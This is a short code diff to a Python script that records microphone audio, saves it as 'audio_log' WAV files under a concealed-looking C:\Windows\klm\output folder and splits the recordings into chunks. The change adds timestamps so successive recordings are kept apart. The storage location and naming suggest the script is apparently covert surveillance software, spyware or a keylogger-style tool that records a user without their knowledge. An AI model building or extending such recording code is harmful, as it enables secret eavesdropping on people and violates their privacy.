@@ -4,6 +4,7 @@ import sounddevice as sd
 import wave
 import math
 import threading
+from datetime import datetime
 
 # Shared settings
 output_directory = "C:\\Windows\\klm\\output"
@@ -16,7 +17,8 @@ def record_audio():
     try:
         fs = 44100  # Sample rate
         seconds = MICROPHONE_DURATION  # Duration of recording
-        audio_path = os.path.join(output_directory, "audio_log.wav")
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        audio_path = os.path.join(output_directory, f"audio_log_{timestamp}.wav")
 
         logging.info("Starting audio recording...")
         myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2, dtype='int16')
@@ -49,8 +51,10 @@ def split_audio_file(audio_path):
         frames_per_chunk = chunk_size // (params.sampwidth * params.nchannels)
         num_chunks = math.ceil(total_frames / frames_per_chunk)
 
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+
         for i in range(num_chunks):
-            chunk_path = os.path.join(output_directory, f"audio_log_part_{i+1}.wav")
+            chunk_path = os.path.join(output_directory, f"audio_log_{timestamp}_part_{i+1}.wav")
             with wave.open(chunk_path, 'wb') as chunk_wf:
                 chunk_wf.setparams(params)
                 frames = wf.readframes(frames_per_chunk)
